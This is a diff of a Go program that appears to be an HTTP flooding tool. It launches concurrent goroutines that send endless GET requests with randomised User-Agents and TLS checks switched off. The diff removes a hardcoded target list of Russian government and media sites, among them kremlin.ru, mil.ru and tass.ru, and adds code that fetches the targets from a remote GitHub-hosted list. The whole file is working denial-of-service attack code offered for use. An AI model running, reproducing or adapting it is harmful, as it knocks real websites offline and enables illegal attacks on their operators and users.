@@ -1,31 +1,19 @@
 package main
 
 import (
+	"bufio"
 	"crypto/tls"
 	"flag"
 	"fmt"
-	"net/http"
-	"sync"
 	"github.com/corpix/uarand"
+	"net/http"
 	"strconv"
+	"sync"
 	"time"
 )
 
 func main() {
-	urls := []string{
-		"https://kremlin.ru",
-		"https://government.ru",
-		"https://mil.ru",
-		"https://www.rt.com/",
-		"http://lenta.ru/",
-		"https://ria.ru/",
-		"https://www.rbc.ru/",
-		"https://tass.ru/",
-		"https://tvzvezda.ru/",
-		"https://vsoloviev.ru/",
-		"https://www.1tv.ru/",
-		"https://www.vesti.ru/",
-}
+	var urls []string
 
 	var concurrency int
 	flag.IntVar(&concurrency, "c", 16, "concurrency level")
@@ -35,14 +23,41 @@ func main() {
 
 	flag.Parse()
 
-	// urlsChannel := make(chan string)
 	outputChannel := make(chan string)
 
 	// req counter
 	var (
-		mutex sync.Mutex
+		mutex    sync.Mutex
 		reqCount uint64
 	)
+
+	client := &http.Client{
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
+		Transport: &http.Transport{
+			DisableKeepAlives: true,
+			TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+
+	req, err := http.NewRequest("GET", "https://raw.githubusercontent.com/jansramek/httpush/master/url-list.txt", nil)
+	resp, err := client.Do(req)
+
+	if err != nil {
+		fmt.Println("[error] cannot get the list of urls - " + err.Error())
+		return
+	}
+
+	scanner := bufio.NewScanner(resp.Body)
+	for scanner.Scan() {
+		urls = append(urls, scanner.Text())
+	}
+
+	if err != nil {
+		fmt.Println("[error] cannot parse the list of urls")
+	}
+	resp.Body.Close()
 
 	// Start req routines
 	var jobWG sync.WaitGroup
@@ -55,7 +70,7 @@ func main() {
 
 	for i := 0; i < concurrency; i++ {
 		jobWG.Add(1)
-		go makeReq(urls[i % len(urls)], outputChannel, &reqCount, mutex, &jobWG, debug)
+		go makeReq(urls[i%len(urls)], outputChannel, &reqCount, mutex, &jobWG, debug)
 	}
 
 	// Start the output chan worker for results
@@ -79,13 +94,13 @@ func main() {
 	outputWG.Wait()
 }
 
-func makeReq(url string, o chan string, reqCount *uint64, mutex sync.Mutex, group *sync.WaitGroup, debug bool)  {
-	if (debug) {
+func makeReq(url string, o chan string, reqCount *uint64, mutex sync.Mutex, group *sync.WaitGroup, debug bool) {
+	if debug {
 		o <- "[info] started thread for " + url
 	}
 
 	for true {
-		if (debug) {
+		if debug {
 			o <- "[info] probing " + url
 		}
 
@@ -95,16 +110,15 @@ func makeReq(url string, o chan string, reqCount *uint64, mutex sync.Mutex, grou
 			},
 			Transport: &http.Transport{
 				DisableKeepAlives: true,
-				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+				TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
 			},
-
 		}
 
 		req, err := http.NewRequest("GET", url, nil)
 		req.Header.Add("User-Agent", uarand.GetRandom())
 
 		if err != nil {
-			if (debug) {
+			if debug {
 				o <- "[error] " + err.Error()
 			}
 			continue
@@ -114,15 +128,15 @@ func makeReq(url string, o chan string, reqCount *uint64, mutex sync.Mutex, grou
 		*reqCount++
 		mutex.Unlock()
 
-		if (err != nil) {
-			if (debug) {
+		if err != nil {
+			if debug {
 				o <- "[error] " + err.Error()
 			}
 			continue
 		}
 		resp.Body.Close()
 
-		if (debug) {
+		if debug {
 			o <- "[" + fmt.Sprintf("%d", resp.StatusCode) + "] " + url
 		}
 	}
@@ -132,6 +146,6 @@ func makeReq(url string, o chan string, reqCount *uint64, mutex sync.Mutex, grou
 
 func printStatus(o chan string, reqCount *uint64) {
 	for range time.Tick(time.Second * 120) {
-		o <-  "[status] " + time.Now().Format("15:04") + " running... " + strconv.FormatInt(int64(*reqCount), 10) + " request sent"
+		o <- "[status] " + time.Now().Format("15:04") + " running... " + strconv.FormatInt(int64(*reqCount), 10) + " request sent"
 	}
 }
